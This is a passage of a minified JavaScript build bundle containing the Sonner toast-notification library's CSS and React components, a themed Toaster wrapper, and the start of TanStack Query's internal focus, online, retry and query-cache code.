:where([data-icon]){display:flex;height:16px;width:16px;position:relative;justify-content:flex-start;align-items:center;flex-shrink:0;margin-left:var(--toast-icon-margin-start);margin-right:var(--toast-icon-margin-end)}:where([data-sonner-toast][data-promise="true"]) :where([data-icon])>svg{opacity:0;transform:scale(.8);transform-origin:center;animation:sonner-fade-in .3s ease forwards}:where([data-sonner-toast]) :where([data-icon])>*{flex-shrink:0}:where([data-sonner-toast]) :where([data-icon]) svg{margin-left:var(--toast-svg-margin-start);margin-right:var(--toast-svg-margin-end)}:where([data-sonner-toast]) :where([data-content]){display:flex;flex-direction:column;gap:2px}[data-sonner-toast][data-styled=true] [data-button]{border-radius:4px;padding-left:8px;padding-right:8px;height:24px;font-size:12px;color:var(--normal-bg);background:var(--normal-text);margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end);border:none;cursor:pointer;outline:none;display:flex;align-items:center;flex-shrink:0;transition:opacity .4s,box-shadow .2s}:where([data-sonner-toast]) :where([data-button]):focus-visible{box-shadow:0 0 0 2px #0006}:where([data-sonner-toast]) :where([data-button]):first-of-type{margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end)}:where([data-sonner-toast]) :where([data-cancel]){color:var(--normal-text);background:rgba(0,0,0,.08)}:where([data-sonner-toast][data-theme="dark"]) :where([data-cancel]){background:rgba(255,255,255,.3)}:where([data-sonner-toast]) :where([data-close-button]){position:absolute;left:var(--toast-close-button-start);right:var(--toast-close-button-end);top:0;height:20px;width:20px;display:flex;justify-content:center;align-items:center;padding:0;background:var(--gray1);color:var(--gray12);border:1px solid var(--gray4);transform:var(--toast-close-button-transform);border-radius:50%;cursor:pointer;z-index:1;transition:opacity .1s,background .2s,border-color .2s}:where([data-sonner-toast]) :where([data-close-button]):focus-visible{box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}:where([data-sonner-toast]) :where([data-disabled="true"]){cursor:not-allowed}:where([data-sonner-toast]):hover :where([data-close-button]):hover{background:var(--gray2);border-color:var(--gray5)}:where([data-sonner-toast][data-swiping="true"]):before{content:"";position:absolute;left:0;right:0;height:100%;z-index:-1}:where([data-sonner-toast][data-y-position="top"][data-swiping="true"]):before{bottom:50%;transform:scaleY(3) translateY(50%)}:where([data-sonner-toast][data-y-position="bottom"][data-swiping="true"]):before{top:50%;transform:scaleY(3) translateY(-50%)}:where([data-sonner-toast][data-swiping="false"][data-removed="true"]):before{content:"";position:absolute;inset:0;transform:scaleY(2)}:where([data-sonner-toast]):after{content:"";position:absolute;left:0;height:calc(var(--gap) + 1px);bottom:100%;width:100%}:where([data-sonner-toast][data-mounted="true"]){--y: translateY(0);opacity:1}:where([data-sonner-toast][data-expanded="false"][data-front="false"]){--scale: var(--toasts-before) * .05 + 1;--y: translateY(calc(var(--lift-amount) * var(--toasts-before))) scale(calc(-1 * var(--scale)));height:var(--front-toast-height)}:where([data-sonner-toast])>*{transition:opacity .4s}:where([data-sonner-toast][data-expanded="false"][data-front="false"][data-styled="true"])>*{opacity:0}:where([data-sonner-toast][data-visible="false"]){opacity:0;pointer-events:none}:where([data-sonner-toast][data-mounted="true"][data-expanded="true"]){--y: translateY(calc(var(--lift) * var(--offset)));height:var(--initial-height)}:where([data-sonner-toast][data-removed="true"][data-front="true"][data-swipe-out="false"]){--y: translateY(calc(var(--lift) * -100%));opacity:0}:where([data-sonner-toast][data-removed="true"][data-front="false"][data-swipe-out="false"][data-expanded="true"]){--y: translateY(calc(var(--lift) * var(--offset) + var(--lift) * -100%));opacity:0}:where([data-sonner-toast][data-removed="true"][data-front="false"][data-swipe-out="false"][data-expanded="false"]){--y: translateY(40%);opacity:0;transition:transform .5s,opacity .2s}:where([data-sonner-toast][data-removed="true"][data-front="false"]):before{height:calc(var(--initial-height) + 20%)}[data-sonner-toast][data-swiping=true]{transform:var(--y) translateY(var(--swipe-amount, 0px));transition:none}[data-sonner-toast][data-swipe-out=true][data-y-position=bottom],[data-sonner-toast][data-swipe-out=true][data-y-position=top]{animation:swipe-out .2s ease-out forwards}@keyframes swipe-out{0%{transform:translateY(calc(var(--lift) * var(--offset) + var(--swipe-amount)));opacity:1}to{transform:translateY(calc(var(--lift) * var(--offset) + var(--swipe-amount) + var(--lift) * -100%));opacity:0}}@media (max-width: 600px){[data-sonner-toaster]{position:fixed;--mobile-offset: 16px;right:var(--mobile-offset);left:var(--mobile-offset);width:100%}[data-sonner-toaster] [data-sonner-toast]{left:0;right:0;width:calc(100% - var(--mobile-offset) * 2)}[data-sonner-toaster][data-x-position=left]{left:var(--mobile-offset)}[data-sonner-toaster][data-y-position=bottom]{bottom:20px}[data-sonner-toaster][data-y-position=top]{top:20px}[data-sonner-toaster][data-x-position=center]{left:var(--mobile-offset);right:var(--mobile-offset);transform:none}}[data-sonner-toaster][data-theme=light]{--normal-bg: #fff;--normal-border: var(--gray4);--normal-text: var(--gray12);--success-bg: hsl(143, 85%, 96%);--success-border: hsl(145, 92%, 91%);--success-text: hsl(140, 100%, 27%);--info-bg: hsl(208, 100%, 97%);--info-border: hsl(221, 91%, 91%);--info-text: hsl(210, 92%, 45%);--warning-bg: hsl(49, 100%, 97%);--warning-border: hsl(49, 91%, 91%);--warning-text: hsl(31, 92%, 45%);--error-bg: hsl(359, 100%, 97%);--error-border: hsl(359, 100%, 94%);--error-text: hsl(360, 100%, 45%)}[data-sonner-toaster][data-theme=light] [data-sonner-toast][data-invert=true]{--normal-bg: #000;--normal-border: hsl(0, 0%, 20%);--normal-text: var(--gray1)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast][data-invert=true]{--normal-bg: #fff;--normal-border: var(--gray3);--normal-text: var(--gray12)}[data-sonner-toaster][data-theme=dark]{--normal-bg: #000;--normal-border: hsl(0, 0%, 20%);--normal-text: var(--gray1);--success-bg: hsl(150, 100%, 6%);--success-border: hsl(147, 100%, 12%);--success-text: hsl(150, 86%, 65%);--info-bg: hsl(215, 100%, 6%);--info-border: hsl(223, 100%, 12%);--info-text: hsl(216, 87%, 65%);--warning-bg: hsl(64, 100%, 6%);--warning-border: hsl(60, 100%, 12%);--warning-text: hsl(46, 87%, 65%);--error-bg: hsl(358, 76%, 10%);--error-border: hsl(357, 89%, 16%);--error-text: hsl(358, 100%, 81%)}[data-rich-colors=true][data-sonner-toast][data-type=success],[data-rich-colors=true][data-sonner-toast][data-type=success] [data-close-button]{background:var(--success-bg);border-color:var(--success-border);color:var(--success-text)}[data-rich-colors=true][data-sonner-toast][data-type=info],[data-rich-colors=true][data-sonner-toast][data-type=info] [data-close-button]{background:var(--info-bg);border-color:var(--info-border);color:var(--info-text)}[data-rich-colors=true][data-sonner-toast][data-type=warning],[data-rich-colors=true][data-sonner-toast][data-type=warning] [data-close-button]{background:var(--warning-bg);border-color:var(--warning-border);color:var(--warning-text)}[data-rich-colors=true][data-sonner-toast][data-type=error],[data-rich-colors=true][data-sonner-toast][data-type=error] [data-close-button]{background:var(--error-bg);border-color:var(--error-border);color:var(--error-text)}.sonner-loading-wrapper{--size: 16px;height:var(--size);width:var(--size);position:absolute;inset:0;z-index:10}.sonner-loading-wrapper[data-visible=false]{transform-origin:center;animation:sonner-fade-out .2s ease forwards}.sonner-spinner{position:relative;top:50%;left:50%;height:var(--size);width:var(--size)}.sonner-loading-bar{animation:sonner-spin 1.2s linear infinite;background:var(--gray11);border-radius:6px;height:8%;left:-10%;position:absolute;top:-3.9%;width:24%}.sonner-loading-bar:nth-child(1){animation-delay:-1.2s;transform:rotate(.0001deg) translate(146%)}.sonner-loading-bar:nth-child(2){animation-delay:-1.1s;transform:rotate(30deg) translate(146%)}.sonner-loading-bar:nth-child(3){animation-delay:-1s;transform:rotate(60deg) translate(146%)}.sonner-loading-bar:nth-child(4){animation-delay:-.9s;transform:rotate(90deg) translate(146%)}.sonner-loading-bar:nth-child(5){animation-delay:-.8s;transform:rotate(120deg) translate(146%)}.sonner-loading-bar:nth-child(6){animation-delay:-.7s;transform:rotate(150deg) translate(146%)}.sonner-loading-bar:nth-child(7){animation-delay:-.6s;transform:rotate(180deg) translate(146%)}.sonner-loading-bar:nth-child(8){animation-delay:-.5s;transform:rotate(210deg) translate(146%)}.sonner-loading-bar:nth-child(9){animation-delay:-.4s;transform:rotate(240deg) translate(146%)}.sonner-loading-bar:nth-child(10){animation-delay:-.3s;transform:rotate(270deg) translate(146%)}.sonner-loading-bar:nth-child(11){animation-delay:-.2s;transform:rotate(300deg) translate(146%)}.sonner-loading-bar:nth-child(12){animation-delay:-.1s;transform:rotate(330deg) translate(146%)}@keyframes sonner-fade-in{0%{opacity:0;transform:scale(.8)}to{opacity:1;transform:scale(1)}}@keyframes sonner-fade-out{0%{opacity:1;transform:scale(1)}to{opacity:0;transform:scale(.8)}}@keyframes sonner-spin{0%{opacity:1}to{opacity:.15}}@media (prefers-reduced-motion){[data-sonner-toast],[data-sonner-toast]>*,.sonner-loading-bar{transition:none!important;animation:none!important}}.sonner-loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);transform-origin:center;transition:opacity .2s,transform .2s}.sonner-loader[data-visible=false]{opacity:0;transform:scale(.8) translate(-50%,-50%)}
`);function lu(t){return t.label!==void 0}var sO=3,oO="32px",aO=4e3,lO=356,cO=14,uO=20,dO=200;function hO(...t){return t.filter(Boolean).join(" ")}var fO=t=>{var e,n,r,i,s,o,a,c,u,p;let{invert:f,toast:h,unstyled:E,interacting:_,setHeights:y,visibleToasts:C,heights:x,index:w,toasts:S,expanded:N,removeToast:R,defaultRichColors:j,closeButton:T,style:b,cancelButtonStyle:P,actionButtonStyle:k,className:O="",descriptionClassName:D="",duration:A,position:V,gap:Z,loadingIcon:q,expandByDefault:J,classNames:L,icons:z,closeButtonAriaLabel:Y="Close toast",pauseWhenPageIsHidden:K,cn:Q}=t,[X,Re]=H.useState(!1),[Je,ye]=H.useState(!1),[pt,zn]=H.useState(!1),[Bn,Gt]=H.useState(!1),[cr,Vn]=H.useState(0),[_n,ur]=H.useState(0),Ur=H.useRef(null),wn=H.useRef(null),ma=w===0,ga=w+1<=C,qe=h.type,Hn=h.dismissible!==!1,Nc=h.className||"",nf=h.descriptionClassName||"",$r=H.useMemo(()=>x.findIndex(ne=>ne.toastId===h.id)||0,[x,h.id]),va=H.useMemo(()=>{var ne;return(ne=h.closeButton)!=null?ne:T},[h.closeButton,T]),ya=H.useMemo(()=>h.duration||A||aO,[h.duration,A]),Ye=H.useRef(0),$e=H.useRef(0),Zi=H.useRef(0),dr=H.useRef(null),[_a,rf]=V.split("-"),zr=H.useMemo(()=>x.reduce((ne,Ee,Ce)=>Ce>=$r?ne:ne+Ee.height,0),[x,$r]),wa=J2(),kc=h.invert||f,es=qe==="loading";$e.current=H.useMemo(()=>$r*Z+zr,[$r,zr]),H.useEffect(()=>{Re(!0)},[]),H.useLayoutEffect(()=>{if(!X)return;let ne=wn.current,Ee=ne.style.height;ne.style.height="auto";let Ce=ne.getBoundingClientRect().height;ne.style.height=Ee,ur(Ce),y(mt=>mt.find(Mt=>Mt.toastId===h.id)?mt.map(Mt=>Mt.toastId===h.id?{...Mt,height:Ce}:Mt):[{toastId:h.id,height:Ce,position:h.position},...mt])},[X,h.title,h.description,y,h.id]);let Wn=H.useCallback(()=>{ye(!0),Vn($e.current),y(ne=>ne.filter(Ee=>Ee.toastId!==h.id)),setTimeout(()=>{R(h)},dO)},[h,R,y,$e]);H.useEffect(()=>{if(h.promise&&qe==="loading"||h.duration===1/0||h.type==="loading")return;let ne,Ee=ya;return N||_||K&&wa?(()=>{if(Zi.current<Ye.current){let Ce=new Date().getTime()-Ye.current;Ee=Ee-Ce}Zi.current=new Date().getTime()})():Ee!==1/0&&(Ye.current=new Date().getTime(),ne=setTimeout(()=>{var Ce;(Ce=h.onAutoClose)==null||Ce.call(h,h),Wn()},Ee)),()=>clearTimeout(ne)},[N,_,J,h,ya,Wn,h.promise,qe,K,wa]),H.useEffect(()=>{let ne=wn.current;if(ne){let Ee=ne.getBoundingClientRect().height;return ur(Ee),y(Ce=>[{toastId:h.id,height:Ee,position:h.position},...Ce]),()=>y(Ce=>Ce.filter(mt=>mt.toastId!==h.id))}},[y,h.id]),H.useEffect(()=>{h.delete&&Wn()},[Wn,h.delete]);function sf(){return z!=null&&z.loading?H.createElement("div",{className:"sonner-loader","data-visible":qe==="loading"},z.loading):q?H.createElement("div",{className:"sonner-loader","data-visible":qe==="loading"},q):H.createElement(G2,{visible:qe==="loading"})}return H.createElement("li",{"aria-live":h.important?"assertive":"polite","aria-atomic":"true",role:"status",tabIndex:0,ref:wn,className:Q(O,Nc,L==null?void 0:L.toast,(e=h==null?void 0:h.classNames)==null?void 0:e.toast,L==null?void 0:L.default,L==null?void 0:L[qe],(n=h==null?void 0:h.classNames)==null?void 0:n[qe]),"data-sonner-toast":"","data-rich-colors":(r=h.richColors)!=null?r:j,"data-styled":!(h.jsx||h.unstyled||E),"data-mounted":X,"data-promise":!!h.promise,"data-removed":Je,"data-visible":ga,"data-y-position":_a,"data-x-position":rf,"data-index":w,"data-front":ma,"data-swiping":pt,"data-dismissible":Hn,"data-type":qe,"data-invert":kc,"data-swipe-out":Bn,"data-expanded":!!(N||J&&X),style:{"--index":w,"--toasts-before":w,"--z-index":S.length-w,"--offset":`${Je?cr:$e.current}px`,"--initial-height":J?"auto":`${_n}px`,...b,...h.style},onPointerDown:ne=>{es||!Hn||(Ur.current=new Date,Vn($e.current),ne.target.setPointerCapture(ne.pointerId),ne.target.tagName!=="BUTTON"&&(zn(!0),dr.current={x:ne.clientX,y:ne.clientY}))},onPointerUp:()=>{var ne,Ee,Ce,mt;if(Bn||!Hn)return;dr.current=null;let Mt=Number(((ne=wn.current)==null?void 0:ne.style.getPropertyValue("--swipe-amount").replace("px",""))||0),Br=new Date().getTime()-((Ee=Ur.current)==null?void 0:Ee.getTime()),Vr=Math.abs(Mt)/Br;if(Math.abs(Mt)>=uO||Vr>.11){Vn($e.current),(Ce=h.onDismiss)==null||Ce.call(h,h),Wn(),Gt(!0);return}(mt=wn.current)==null||mt.style.setProperty("--swipe-amount","0px"),zn(!1)},onPointerMove:ne=>{var Ee;if(!dr.current||!Hn)return;let Ce=ne.clientY-dr.current.y,mt=ne.clientX-dr.current.x,Mt=(_a==="top"?Math.min:Math.max)(0,Ce),Br=ne.pointerType==="touch"?10:2;Math.abs(Mt)>Br?(Ee=wn.current)==null||Ee.style.setProperty("--swipe-amount",`${Ce}px`):Math.abs(mt)>Br&&(dr.current=null)}},va&&!h.jsx?H.createElement("button",{"aria-label":Y,"data-disabled":es,"data-close-button":!0,onClick:es||!Hn?()=>{}:()=>{var ne;Wn(),(ne=h.onDismiss)==null||ne.call(h,h)},className:Q(L==null?void 0:L.closeButton,(i=h==null?void 0:h.classNames)==null?void 0:i.closeButton)},H.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",width:"12",height:"12",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"1.5",strokeLinecap:"round",strokeLinejoin:"round"},H.createElement("line",{x1:"18",y1:"6",x2:"6",y2:"18"}),H.createElement("line",{x1:"6",y1:"6",x2:"18",y2:"18"}))):null,h.jsx||H.isValidElement(h.title)?h.jsx||h.title:H.createElement(H.Fragment,null,qe||h.icon||h.promise?H.createElement("div",{"data-icon":"",className:Q(L==null?void 0:L.icon,(s=h==null?void 0:h.classNames)==null?void 0:s.icon)},h.promise||h.type==="loading"&&!h.icon?h.icon||sf():null,h.type!=="loading"?h.icon||(z==null?void 0:z[qe])||W2(qe):null):null,H.createElement("div",{"data-content":"",className:Q(L==null?void 0:L.content,(o=h==null?void 0:h.classNames)==null?void 0:o.content)},H.createElement("div",{"data-title":"",className:Q(L==null?void 0:L.title,(a=h==null?void 0:h.classNames)==null?void 0:a.title)},h.title),h.description?H.createElement("div",{"data-description":"",className:Q(D,nf,L==null?void 0:L.description,(c=h==null?void 0:h.classNames)==null?void 0:c.description)},h.description):null),H.isValidElement(h.cancel)?h.cancel:h.cancel&&lu(h.cancel)?H.createElement("button",{"data-button":!0,"data-cancel":!0,style:h.cancelButtonStyle||P,onClick:ne=>{var Ee,Ce;lu(h.cancel)&&Hn&&((Ce=(Ee=h.cancel).onClick)==null||Ce.call(Ee,ne),Wn())},className:Q(L==null?void 0:L.cancelButton,(u=h==null?void 0:h.classNames)==null?void 0:u.cancelButton)},h.cancel.label):null,H.isValidElement(h.action)?h.action:h.action&&lu(h.action)?H.createElement("button",{"data-button":!0,"data-action":!0,style:h.actionButtonStyle||k,onClick:ne=>{var Ee,Ce;lu(h.action)&&(ne.defaultPrevented||((Ce=(Ee=h.action).onClick)==null||Ce.call(Ee,ne),Wn()))},className:Q(L==null?void 0:L.actionButton,(p=h==null?void 0:h.classNames)==null?void 0:p.actionButton)},h.action.label):null))};function ew(){if(typeof window>"u"||typeof document>"u")return"ltr";let t=document.documentElement.getAttribute("dir");return t==="auto"||!t?window.getComputedStyle(document.documentElement).direction:t}var pO=t=>{let{invert:e,position:n="bottom-right",hotkey:r=["altKey","KeyT"],expand:i,closeButton:s,className:o,offset:a,theme:c="light",richColors:u,duration:p,style:f,visibleToasts:h=sO,toastOptions:E,dir:_=ew(),gap:y=cO,loadingIcon:C,icons:x,containerAriaLabel:w="Notifications",pauseWhenPageIsHidden:S,cn:N=hO}=t,[R,j]=H.useState([]),T=H.useMemo(()=>Array.from(new Set([n].concat(R.filter(K=>K.position).map(K=>K.position)))),[R,n]),[b,P]=H.useState([]),[k,O]=H.useState(!1),[D,A]=H.useState(!1),[V,Z]=H.useState(c!=="system"?c:typeof window<"u"&&window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"),q=H.useRef(null),J=r.join("+").replace(/Key/g,"").replace(/Digit/g,""),L=H.useRef(null),z=H.useRef(!1),Y=H.useCallback(K=>{var Q;(Q=R.find(X=>X.id===K.id))!=null&&Q.delete||Yt.dismiss(K.id),j(X=>X.filter(({id:Re})=>Re!==K.id))},[R]);return H.useEffect(()=>Yt.subscribe(K=>{if(K.dismiss){j(Q=>Q.map(X=>X.id===K.id?{...X,delete:!0}:X));return}setTimeout(()=>{RS.flushSync(()=>{j(Q=>{let X=Q.findIndex(Re=>Re.id===K.id);return X!==-1?[...Q.slice(0,X),{...Q[X],...K},...Q.slice(X+1)]:[K,...Q]})})})}),[]),H.useEffect(()=>{if(c!=="system"){Z(c);return}c==="system"&&(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?Z("dark"):Z("light")),typeof window<"u"&&window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:K})=>{Z(K?"dark":"light")})},[c]),H.useEffect(()=>{R.length<=1&&O(!1)},[R]),H.useEffect(()=>{let K=Q=>{var X,Re;r.every(Je=>Q[Je]||Q.code===Je)&&(O(!0),(X=q.current)==null||X.focus()),Q.code==="Escape"&&(document.activeElement===q.current||(Re=q.current)!=null&&Re.contains(document.activeElement))&&O(!1)};return document.addEventListener("keydown",K),()=>document.removeEventListener("keydown",K)},[r]),H.useEffect(()=>{if(q.current)return()=>{L.current&&(L.current.focus({preventScroll:!0}),L.current=null,z.current=!1)}},[q.current]),R.length?H.createElement("section",{"aria-label":`${w} ${J}`,tabIndex:-1},T.map((K,Q)=>{var X;let[Re,Je]=K.split("-");return H.createElement("ol",{key:K,dir:_==="auto"?ew():_,tabIndex:-1,ref:q,className:o,"data-sonner-toaster":!0,"data-theme":V,"data-y-position":Re,"data-x-position":Je,style:{"--front-toast-height":`${((X=b[0])==null?void 0:X.height)||0}px`,"--offset":typeof a=="number"?`${a}px`:a||oO,"--width":`${lO}px`,"--gap":`${y}px`,...f},onBlur:ye=>{z.current&&!ye.currentTarget.contains(ye.relatedTarget)&&(z.current=!1,L.current&&(L.current.focus({preventScroll:!0}),L.current=null))},onFocus:ye=>{ye.target instanceof HTMLElement&&ye.target.dataset.dismissible==="false"||z.current||(z.current=!0,L.current=ye.relatedTarget)},onMouseEnter:()=>O(!0),onMouseMove:()=>O(!0),onMouseLeave:()=>{D||O(!1)},onPointerDown:ye=>{ye.target instanceof HTMLElement&&ye.target.dataset.dismissible==="false"||A(!0)},onPointerUp:()=>A(!1)},R.filter(ye=>!ye.position&&Q===0||ye.position===K).map((ye,pt)=>{var zn,Bn;return H.createElement(fO,{key:ye.id,icons:x,index:pt,toast:ye,defaultRichColors:u,duration:(zn=E==null?void 0:E.duration)!=null?zn:p,className:E==null?void 0:E.className,descriptionClassName:E==null?void 0:E.descriptionClassName,invert:e,visibleToasts:h,closeButton:(Bn=E==null?void 0:E.closeButton)!=null?Bn:s,interacting:D,position:K,style:E==null?void 0:E.style,unstyled:E==null?void 0:E.unstyled,classNames:E==null?void 0:E.classNames,cancelButtonStyle:E==null?void 0:E.cancelButtonStyle,actionButtonStyle:E==null?void 0:E.actionButtonStyle,removeToast:Y,toasts:R.filter(Gt=>Gt.position==ye.position),heights:b.filter(Gt=>Gt.position==ye.position),setHeights:P,expandByDefault:i,gap:y,loadingIcon:C,expanded:k,pauseWhenPageIsHidden:S,cn:N})}))})):null};const mO=({...t})=>{const{theme:e="system"}=H2();return d.jsx(pO,{theme:e,className:"toaster group",toastOptions:{classNames:{toast:"group toast group-[.toaster]:bg-background group-[.toaster]:text-foreground group-[.toaster]:border-border group-[.toaster]:shadow-lg",description:"group-[.toast]:text-muted-foreground",actionButton:"group-[.toast]:bg-primary group-[.toast]:text-primary-foreground",cancelButton:"group-[.toast]:bg-muted group-[.toast]:text-muted-foreground"}},...t})};var wh=class{constructor(){this.listeners=new Set,this.subscribe=this.subscribe.bind(this)}subscribe(t){return this.listeners.add(t),this.onSubscribe(),()=>{this.listeners.delete(t),this.onUnsubscribe()}}hasListeners(){return this.listeners.size>0}onSubscribe(){}onUnsubscribe(){}},xh=typeof window>"u"||"Deno"in globalThis;function Sn(){}function gO(t,e){return typeof t=="function"?t(e):t}function vO(t){return typeof t=="number"&&t>=0&&t!==1/0}function yO(t,e){return Math.max(t+(e||0)-Date.now(),0)}function tw(t,e){return typeof t=="function"?t(e):t}function _O(t,e){return typeof t=="function"?t(e):t}function nw(t,e){const{type:n="all",exact:r,fetchStatus:i,predicate:s,queryKey:o,stale:a}=t;if(o){if(r){if(e.queryHash!==wv(o,e.options))return!1}else if(!Ml(e.queryKey,o))return!1}if(n!=="all"){const c=e.isActive();if(n==="active"&&!c||n==="inactive"&&c)return!1}return!(typeof a=="boolean"&&e.isStale()!==a||i&&i!==e.state.fetchStatus||s&&!s(e))}function rw(t,e){const{exact:n,status:r,predicate:i,mutationKey:s}=t;if(s){if(!e.options.mutationKey)return!1;if(n){if(jl(e.options.mutationKey)!==jl(s))return!1}else if(!Ml(e.options.mutationKey,s))return!1}return!(r&&e.state.status!==r||i&&!i(e))}function wv(t,e){return((e==null?void 0:e.queryKeyHashFn)||jl)(t)}function jl(t){return JSON.stringify(t,(e,n)=>Im(n)?Object.keys(n).sort().reduce((r,i)=>(r[i]=n[i],r),{}):n)}function Ml(t,e){return t===e?!0:typeof t!=typeof e?!1:t&&e&&typeof t=="object"&&typeof e=="object"?!Object.keys(e).some(n=>!Ml(t[n],e[n])):!1}function x1(t,e){if(t===e)return t;const n=iw(t)&&iw(e);if(n||Im(t)&&Im(e)){const r=n?t:Object.keys(t),i=r.length,s=n?e:Object.keys(e),o=s.length,a=n?[]:{};let c=0;for(let u=0;u<o;u++){const p=n?u:s[u];(!n&&r.includes(p)||n)&&t[p]===void 0&&e[p]===void 0?(a[p]=void 0,c++):(a[p]=x1(t[p],e[p]),a[p]===t[p]&&t[p]!==void 0&&c++)}return i===o&&c===i?t:a}return e}function iw(t){return Array.isArray(t)&&t.length===Object.keys(t).length}function Im(t){if(!sw(t))return!1;const e=t.constructor;if(e===void 0)return!0;const n=e.prototype;return!(!sw(n)||!n.hasOwnProperty("isPrototypeOf")||Object.getPrototypeOf(t)!==Object.prototype)}function sw(t){return Object.prototype.toString.call(t)==="[object Object]"}function wO(t){return new Promise(e=>{setTimeout(e,t)})}function xO(t,e,n){return typeof n.structuralSharing=="function"?n.structuralSharing(t,e):n.structuralSharing!==!1?x1(t,e):e}function EO(t,e,n=0){const r=[...t,e];return n&&r.length>n?r.slice(1):r}function CO(t,e,n=0){const r=[e,...t];return n&&r.length>n?r.slice(0,-1):r}var xv=Symbol();function E1(t,e){return!t.queryFn&&(e!=null&&e.initialPromise)?()=>e.initialPromise:!t.queryFn||t.queryFn===xv?()=>Promise.reject(new Error(`Missing queryFn: '${t.queryHash}'`)):t.queryFn}var fs,ai,Eo,cE,SO=(cE=class extends wh{constructor(){super();we(this,fs);we(this,ai);we(this,Eo);se(this,Eo,e=>{if(!xh&&window.addEventListener){const n=()=>e();return window.addEventListener("visibilitychange",n,!1),()=>{window.removeEventListener("visibilitychange",n)}}})}onSubscribe(){U(this,ai)||this.setEventListener(U(this,Eo))}onUnsubscribe(){var e;this.hasListeners()||((e=U(this,ai))==null||e.call(this),se(this,ai,void 0))}setEventListener(e){var n;se(this,Eo,e),(n=U(this,ai))==null||n.call(this),se(this,ai,e(r=>{typeof r=="boolean"?this.setFocused(r):this.onFocus()}))}setFocused(e){U(this,fs)!==e&&(se(this,fs,e),this.onFocus())}onFocus(){const e=this.isFocused();this.listeners.forEach(n=>{n(e)})}isFocused(){var e;return typeof U(this,fs)=="boolean"?U(this,fs):((e=globalThis.document)==null?void 0:e.visibilityState)!=="hidden"}},fs=new WeakMap,ai=new WeakMap,Eo=new WeakMap,cE),C1=new SO,Co,li,So,uE,bO=(uE=class extends wh{constructor(){super();we(this,Co,!0);we(this,li);we(this,So);se(this,So,e=>{if(!xh&&window.addEventListener){const n=()=>e(!0),r=()=>e(!1);return window.addEventListener("online",n,!1),window.addEventListener("offline",r,!1),()=>{window.removeEventListener("online",n),window.removeEventListener("offline",r)}}})}onSubscribe(){U(this,li)||this.setEventListener(U(this,So))}onUnsubscribe(){var e;this.hasListeners()||((e=U(this,li))==null||e.call(this),se(this,li,void 0))}setEventListener(e){var n;se(this,So,e),(n=U(this,li))==null||n.call(this),se(this,li,e(this.setOnline.bind(this)))}setOnline(e){U(this,Co)!==e&&(se(this,Co,e),this.listeners.forEach(r=>{r(e)}))}isOnline(){return U(this,Co)}},Co=new WeakMap,li=new WeakMap,So=new WeakMap,uE),_d=new bO;function TO(){let t,e;const n=new Promise((i,s)=>{t=i,e=s});n.status="pending",n.catch(()=>{});function r(i){Object.assign(n,i),delete n.resolve,delete n.reject}return n.resolve=i=>{r({status:"fulfilled",value:i}),t(i)},n.reject=i=>{r({status:"rejected",reason:i}),e(i)},n}function IO(t){return Math.min(1e3*2**t,3e4)}function S1(t){return(t??"online")==="online"?_d.isOnline():!0}var b1=class extends Error{constructor(t){super("CancelledError"),this.revert=t==null?void 0:t.revert,this.silent=t==null?void 0:t.silent}};function Xf(t){return t instanceof b1}function T1(t){let e=!1,n=0,r=!1,i;const s=TO(),o=y=>{var C;r||(h(new b1(y)),(C=t.abort)==null||C.call(t))},a=()=>{e=!0},c=()=>{e=!1},u=()=>C1.isFocused()&&(t.networkMode==="always"||_d.isOnline())&&t.canRun(),p=()=>S1(t.networkMode)&&t.canRun(),f=y=>{var C;r||(r=!0,(C=t.onSuccess)==null||C.call(t,y),i==null||i(),s.resolve(y))},h=y=>{var C;r||(r=!0,(C=t.onError)==null||C.call(t,y),i==null||i(),s.reject(y))},E=()=>new Promise(y=>{var C;i=x=>{(r||u())&&y(x)},(C=t.onPause)==null||C.call(t)}).then(()=>{var y;i=void 0,r||(y=t.onContinue)==null||y.call(t)}),_=()=>{if(r)return;let y;const C=n===0?t.initialPromise:void 0;try{y=C??t.fn()}catch(x){y=Promise.reject(x)}Promise.resolve(y).then(f).catch(x=>{var j;if(r)return;const w=t.retry??(xh?0:3),S=t.retryDelay??IO,N=typeof S=="function"?S(n,x):S,R=w===!0||typeof w=="number"&&n<w||typeof w=="function"&&w(n,x);if(e||!R){h(x);return}n++,(j=t.onFail)==null||j.call(t,n,x),wO(N).then(()=>u()?void 0:E()).then(()=>{e?h(x):_()})})};return{promise:s,cancel:o,continue:()=>(i==null||i(),s),cancelRetry:a,continueRetry:c,canStart:p,start:()=>(p()?_():E().then(_),s)}}function NO(){let t=[],e=0,n=a=>{a()},r=a=>{a()},i=a=>setTimeout(a,0);const s=a=>{e?t.push(a):i(()=>{n(a)})},o=()=>{const a=t;t=[],a.length&&i(()=>{r(()=>{a.forEach(c=>{n(c)})})})};return{batch:a=>{let c;e++;try{c=a()}finally{e--,e||o()}return c},batchCalls:a=>(...c)=>{s(()=>{a(...c)})},schedule:s,setNotifyFunction:a=>{n=a},setBatchNotifyFunction:a=>{r=a},setScheduler:a=>{i=a}}}var kt=NO(),ps,dE,I1=(dE=class{constructor(){we(this,ps)}destroy(){this.clearGcTimeout()}scheduleGc(){this.clearGcTimeout(),vO(this.gcTime)&&se(this,ps,setTimeout(()=>{this.optionalRemove()},this.gcTime))}updateGcTime(t){this.gcTime=Math.max(this.gcTime||0,t??(xh?1/0:5*60*1e3))}clearGcTimeout(){U(this,ps)&&(clearTimeout(U(this,ps)),se(this,ps,void 0))}},ps=new WeakMap,dE),bo,To,cn,xt,ec,ms,bn,mr,hE,kO=(hE=class extends I1{constructor(e){super();we(this,bn);we(this,bo);we(this,To);we(this,cn);we(this,xt);we(this,ec);we(this,ms);se(this,ms,!1),se(this,ec,e.defaultOptions),this.setOptions(e.options),this.observers=[],se(this,cn,e.cache),this.queryKey=e.queryKey,this.queryHash=e.queryHash,se(this,bo,RO(this.options)),this.state=e.state??U(this,bo),this.scheduleGc()}get meta(){return this.options.meta}get promise(){var e;return(e=U(this,xt))==null?void 